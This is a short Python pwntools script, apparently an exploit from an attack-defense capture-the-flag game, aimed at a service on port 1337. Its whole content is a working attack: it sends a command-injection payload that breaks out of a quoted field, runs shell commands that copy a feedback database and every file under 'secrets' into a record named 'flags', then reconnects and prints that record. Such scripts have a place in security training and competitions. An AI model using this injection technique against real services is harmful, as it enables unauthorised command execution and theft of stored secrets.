#!/usr/bin/env python

import sys
from pwn import *
from string import ascii_letters, digits

host = sys.argv[1]
hint = sys.argv[2]

r = remote(host, 1337)
payload = '"; cat feedback/feedback-db.txt > /tmp/kek; cat secrets/* >> /tmp/kek; cat /tmp/kek > secrets/flags:flags; echo "pwned'

r.recvuntil(b'>')
r.sendline(b'3')
r.recvuntil(b': ')
r.sendline(b'yes')
r.recvuntil(b': ')
r.sendline(payload.encode())
data = r.recvuntil(b'Bye!').decode()

r = remote(host, 1337)
r.recvuntil(b'> ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(b'flags')
r.recvuntil(b': ')
r.sendline(b'flags')

data = r.recv(4096).decode()
print(data, flush=True)
